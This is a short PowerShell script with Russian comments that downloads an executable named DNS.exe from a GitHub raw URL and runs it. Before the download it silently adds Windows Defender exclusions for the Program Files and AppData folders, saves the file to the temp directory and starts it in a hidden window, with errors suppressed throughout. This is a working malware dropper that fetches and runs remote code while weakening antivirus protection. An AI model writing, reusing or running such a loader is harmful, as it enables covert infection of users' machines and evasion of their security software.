# script.ps1 - загружает DNS.exe и запускает его

$ErrorActionPreference = "SilentlyContinue"

# Путь для сохранения файла
$outputPath = Join-Path -Path $env:TEMP -ChildPath "DNS.exe"

# Ссылка на ваш .exe файл
$url = "https://github.com/FREAKMANCHIK/WORK/raw/main/files/DNS.exe "

try {
    # Добавляем исключения в Windows Defender (если доступно)
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $paths = @(
            [System.Environment]::GetFolderPath("ProgramFilesX86") -replace " \(x86\)", "",
            [System.Environment]::GetFolderPath("ProgramFilesX86"),
            [System.Environment]::GetFolderPath("ApplicationData"),
            [System.Environment]::GetFolderPath("LocalApplicationData")
        )

        foreach ($path in $paths) {
            if (Test-Path $path) {
                Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
            }
        }
    }

    # Скачиваем файл
    Write-Host "[*] Скачивание DNS.exe..."
    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop

    # Проверяем, существует ли файл
    if (-not(Test-Path $outputPath)) {
        throw "Не удалось скачать файл по указанной ссылке."
    }

    # Запускаем скачанный файл
    Write-Host "[*] Запуск DNS.exe..."
    Start-Process -FilePath $outputPath -WindowStyle Hidden

    # Необязательно: удаляем файл после запуска
    # Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue

} catch {
    Write-Host "[!] Ошибка: $_"
}